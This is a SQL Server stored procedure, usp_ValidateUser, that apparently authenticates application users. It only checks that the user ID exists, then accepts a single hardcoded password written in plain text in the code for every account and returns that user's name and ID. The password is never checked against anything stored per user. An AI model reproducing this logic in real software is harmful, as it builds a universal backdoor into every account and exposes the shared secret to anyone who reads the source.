ALTER PROCEDURE [dbo].[usp_ValidateUser]
(
    @UserID varchar(20),
	@Password varchar(20) 
)
AS
BEGIN
    -- SET NOCOUNT ON added to prevent extra result sets from
    -- interfering with SELECT statements.
    SET NOCOUNT ON

   declare @count int
   select @count = Count(*) from Users where rtrim(ltrim(lower(@UserID))) = rtrim(ltrim(lower(UserID)))

   If @count > 0
   Begin
		If @Password = 'r@yalberkshire!&398'
		Begin
			select 1 as 'IsFound', FirstName, LastName, ID from Users where rtrim(ltrim(lower(@UserID))) = rtrim(ltrim(lower(UserID)))
		End
		Else
		Begin
			select 0 as 'IsFound', '','', 0
		End
   End
   Else
   Begin
		select 0 as 'IsFound', '','', 0
   End
END
